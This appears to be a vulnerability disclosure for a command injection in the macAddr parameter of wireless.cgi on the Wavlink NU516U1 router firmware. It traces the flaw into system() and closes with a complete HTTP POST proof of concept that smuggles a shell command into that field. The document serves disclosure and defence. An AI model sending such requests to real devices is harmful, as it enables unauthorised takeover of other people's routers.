# Wavlink NU516 AddMac
### Overview
vendor: Wavlink

product: NU516U1

version: M16U1_V240425

type: Command Injection
### Vulnerability Description
Wavlink NU516U1 M16U1_V240425 were discovered to contain a command injection via the macAddr parameter in the sub_403010 function of the file wireless.cgi.
### Vulnerability details
In the ftext function, obtain the value of the page parameter via user input.

![](images/1.png)

Setting the value of the page parameter to AddMac will call the sub_403010 function.

![](images/6.png)

In the sub_403010 function, the value of the macAddr parameter is obtained via a post request. Then, the value of the macAddr parameter is passed to the v6 variable via the sprintf function, which in turn is passed to the sub_405314 function. In the sub_405314 function, the value of the v6 variable is passed into the byte_41BCB4 variable, and finally into the system function.

![](images/7.png)

![](images/5.png)

### POC
```
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 32
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.1/html/networkSetting.shtml
Accept-Encoding: gzip, deflate, br
Cookie: session=1251565210
Connection: keep-alive

page=AddMac&macAddr=$(ls>/2.txt)
```
